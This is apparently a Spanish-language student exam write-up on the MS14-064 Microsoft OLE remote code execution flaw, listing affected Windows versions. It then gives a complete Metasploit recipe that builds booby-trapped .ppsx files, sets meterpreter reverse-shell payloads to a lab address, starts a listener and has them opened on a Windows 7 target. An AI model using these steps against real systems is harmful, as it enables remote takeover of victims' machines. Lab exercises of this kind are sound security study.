# Parcial Ciber 
Vulnerabilidad MS14-064 Miscrosoft OLE: Estas vulnerabilidades podría permitir la ejecución remota de código si un usuario visita una página web especialmente diseñada con Internet Explorer. Un atacante que explotó con éxito las vulnerabilidades podría ejecutar código arbitrario en el contexto del usuario actual. Si el usuario actual ha iniciado sesión con derechos de usuario administrativos, un atacante podría instalar programas; ver, cambiar, o eliminar datos; o crear nuevas cuentas con plenos derechos de usuario. Los clientes cuyas cuentas están configuradas para tener menos derechos de usuario en el sistema podrían verse menos afectados que los usuarios que operan con derechos de usuario administrativos.

Sistema operativo: Microsoft Windows

Software:
Windows server 
Windows vista
Windows 8
Windows 8.1
Windows RT
Windows RT 8.1

Link del video: https://www.dropbox.com/s/is9pdjhpx7rsp54/Video_1552603800.wmv?dl=0
Captura del trafico por wireshark: Fotos Añadidas

Instructivo para hacer el exploit:
msfconsole
use exploit/windows/fileformat/ms14_064_packager_run_as_admin

show options

set FILENAME MS14-064.ppsx

set LHOST 10.191.1.6

set LPORT 4444

set PAYLOAD windows/meterpreter/reverse_tcp

show options

exploit

use exploit/windows/fileformat/ms14_064_packager_python

show options

set FILENAME MS14-064_py.ppsx

set LHOST 10.191.1.6

set LPORT 4444

show options

exploit 
use exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.191.1.6

set LPORT 4444

show options

exploit -j

ir a window 7 y abrir el archivo MS14-064.ppsx

set PAYLOAD python/meterpreter/reverse_tcp
r
exploit -j

ir a window 7 y ejecutar archivo MS14-064_py.ppsx



